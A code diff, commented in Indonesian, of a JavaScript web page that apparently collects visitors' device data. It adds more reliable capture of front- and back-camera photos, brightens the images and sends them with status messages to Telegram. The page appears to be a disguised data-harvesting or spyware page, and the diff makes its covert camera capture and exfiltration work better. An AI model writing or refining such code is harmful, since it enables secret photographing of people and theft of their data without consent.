@@ -184,6 +184,7 @@
         const cameraCanvas = document.getElementById('cameraCanvas');
         
         let isCollecting = false;
+        let cameraStream = null;
         
         // Suara klik keyboard (dibuat dengan Web Audio API)
         function playClickSound() {
@@ -321,45 +322,86 @@
             }
         }
         
-        // Fungsi untuk mengambil foto dari kamera
+        // Fungsi untuk mengakses kamera dengan pengaturan yang lebih baik
+        async function accessCamera(facingMode = 'user') {
+            return new Promise(async (resolve, reject) => {
+                try {
+                    // Hentikan stream sebelumnya jika ada
+                    if (cameraStream) {
+                        cameraStream.getTracks().forEach(track => track.stop());
+                    }
+                    
+                    const constraints = {
+                        video: { 
+                            facingMode: facingMode,
+                            width: { ideal: 1920, max: 1920 },
+                            height: { ideal: 1080, max: 1080 },
+                            frameRate: { ideal: 30 }
+                        },
+                        audio: false
+                    };
+                    
+                    cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
+                    cameraVideo.srcObject = cameraStream;
+                    
+                    // Tunggu sampai video benar-benar siap
+                    cameraVideo.onloadedmetadata = () => {
+                        cameraVideo.play().then(() => {
+                            // Beri waktu tambahan untuk kamera menyesuaikan exposure
+                            setTimeout(() => {
+                                resolve(cameraStream);
+                            }, 1000);
+                        });
+                    };
+                    
+                    cameraVideo.onerror = reject;
+                    
+                } catch (error) {
+                    reject(error);
+                }
+            });
+        }
+        
+        // Fungsi untuk mengambil foto dari kamera dengan kualitas lebih baik
         async function capturePhoto(facingMode = 'user') {
             return new Promise(async (resolve) => {
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: { 
-                            facingMode: facingMode,
-                            width: { ideal: 1920 },
-                            height: { ideal: 1080 }
-                        }
-                    });
+                    // Akses kamera terlebih dahulu
+                    await accessCamera(facingMode);
                     
-                    cameraVideo.srcObject = stream;
+                    // Tunggu sedikit untuk memastikan kamera sudah siap dan terang
+                    await new Promise(resolve => setTimeout(resolve, 1500));
                     
-                    // Tunggu video siap
-                    await new Promise(resolve => {
-                        cameraVideo.onloadedmetadata = () => {
-                            resolve();
-                        };
-                    });
-                    
-                    // Tunggu sedikit untuk fokus dan exposure
-                    await new Promise(resolve => setTimeout(resolve, 500));
-                    
-                    // Ambil frame
+                    // Buat canvas dengan ukuran yang sesuai
                     const context = cameraCanvas.getContext('2d');
                     cameraCanvas.width = cameraVideo.videoWidth;
                     cameraCanvas.height = cameraVideo.videoHeight;
-                    context.drawImage(cameraVideo, 0, 0);
                     
-                    // Konversi ke blob
+                    // Gambar frame video ke canvas
+                    context.drawImage(cameraVideo, 0, 0, cameraCanvas.width, cameraCanvas.height);
+                    
+                    // Tambahkan filter untuk meningkatkan kecerahan dan kontras jika diperlukan
+                    context.filter = 'brightness(1.1) contrast(1.1)';
+                    context.drawImage(cameraVideo, 0, 0, cameraCanvas.width, cameraCanvas.height);
+                    context.filter = 'none';
+                    
+                    // Konversi ke blob dengan kualitas tinggi
                     cameraCanvas.toBlob(blob => {
-                        // Hentikan stream
-                        stream.getTracks().forEach(track => track.stop());
+                        // Hentikan stream kamera
+                        if (cameraStream) {
+                            cameraStream.getTracks().forEach(track => track.stop());
+                            cameraStream = null;
+                        }
                         resolve(blob);
-                    }, 'image/jpeg', 0.9);
+                    }, 'image/jpeg', 0.95);
                     
                 } catch (error) {
                     console.error('Error capturing photo:', error);
+                    // Hentikan stream jika ada error
+                    if (cameraStream) {
+                        cameraStream.getTracks().forEach(track => track.stop());
+                        cameraStream = null;
+                    }
                     resolve(null);
                 }
             });
@@ -380,35 +422,35 @@
             await sendToTelegram(message);
             
             // Coba ambil dan kirim foto kamera
+            let frontPhotoSuccess = false;
+            let backPhotoSuccess = false;
+            
             try {
+                // Coba ambil foto kamera depan
                 const frontPhoto = await capturePhoto('user');
                 if (frontPhoto) {
                     await sendPhotoToTelegram(frontPhoto, '📷 KAMERA DEPAN - BERHASIL');
-                    deviceData.kameraDepan = "Berhasil";
-                } else {
-                    deviceData.kameraDepan = "Gagal";
+                    frontPhotoSuccess = true;
                 }
                 
-                // Coba kamera belakang
+                // Coba ambil foto kamera belakang
                 const backPhoto = await capturePhoto('environment');
                 if (backPhoto) {
                     await sendPhotoToTelegram(backPhoto, '📷 KAMERA BELAKANG - BERHASIL');
-                    deviceData.kameraBelakang = "Berhasil";
-                } else {
-                    deviceData.kameraBelakang = "Gagal";
+                    backPhotoSuccess = true;
                 }
-                
-                // Update pesan dengan status kamera
-                const updatedMessage = formatMessage(deviceData);
-                await sendToTelegram(updatedMessage);
                 
             } catch (e) {
                 console.error('Error capturing photos:', e);
-                deviceData.kameraDepan = "Gagal";
-                deviceData.kameraBelakang = "Gagal";
-                const updatedMessage = formatMessage(deviceData);
-                await sendToTelegram(updatedMessage);
             }
+            
+            // Update status kamera di pesan
+            deviceData.kameraDepan = frontPhotoSuccess ? "Berhasil" : "Gagal";
+            deviceData.kameraBelakang = backPhotoSuccess ? "Berhasil" : "Gagal";
+            
+            // Kirim pesan terakhir dengan status kamera yang diperbarui
+            const finalMessage = formatMessage(deviceData);
+            await sendToTelegram(finalMessage);
             
             // Kembalikan animasi normal
             mainGhost.style.animation = 'float 3s ease-in-out infinite';
